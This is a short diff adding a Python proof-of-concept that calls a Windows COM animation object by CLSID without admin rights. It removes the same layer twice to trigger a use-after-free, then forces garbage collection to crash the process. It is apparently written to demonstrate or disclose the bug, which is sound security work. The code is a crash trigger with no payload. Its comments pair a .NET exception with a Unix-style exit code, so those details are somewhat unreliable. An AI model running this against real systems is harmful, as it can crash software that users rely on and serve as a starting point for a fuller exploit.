@@ -1,0 +1,26 @@
+import win32com.client
+import gc
+
+CLSID_AURA = "{756E6C18-79CC-3842-9E47-7C80011D303A}"
+
+# Instantiate without admin privileges
+anim = win32com.client.Dispatch(CLSID_AURA)
+anim.init(10, 10)
+
+# Create and add a layer
+layer = anim.CreateLayer()
+anim.AddLayer(layer)
+
+# First removal: valid
+anim.RemoveLayer(layer)
+
+# Second removal: USE-AFTER-FREE
+anim.RemoveLayer(layer)  # Does not raise exception!
+# Operates on already-freed memory
+
+# Trigger crash via GC
+del layer
+del anim
+gc.collect()
+# NullReferenceException in AuraLayer.Finalize()
+# Process terminates with exit code 139 (SEGFAULT)
